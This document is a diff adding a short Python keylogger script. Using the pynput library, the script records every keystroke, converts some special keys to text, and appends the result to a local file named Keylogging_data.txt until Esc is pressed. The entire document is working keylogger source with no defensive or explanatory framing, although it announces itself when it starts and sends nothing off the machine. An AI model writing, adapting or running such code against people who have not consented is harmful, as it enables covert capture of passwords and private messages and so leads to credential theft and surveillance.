@@ -1,0 +1,25 @@
+from pynput.keyboard import Listener
+
+def KeyStroke_reader(key):
+    Keystroke_data = str(key)
+    Keystroke_data = Keystroke_data.replace("'","")
+    
+    if Keystroke_data == "Key.space":
+        Keystroke_data = " "
+    if Keystroke_data == "Key.backspace":
+        Keystroke_data = ""
+    if Keystroke_data == "Key.shift":
+        Keystroke_data = ""
+    if Keystroke_data == "Key.shift_r":
+        Keystroke_data = ""
+    if Keystroke_data == "Key.enter":
+        Keystroke_data = "\n"
+    if Keystroke_data == "Key.esc":
+        exit()
+
+    with open("Keylogging_data.txt", 'a') as f:
+        f.write(Keystroke_data)
+
+print("Key logging has started, press esc key to quit")
+with Listener(on_press = KeyStroke_reader) as Listening_tool:
+    Listening_tool.join()
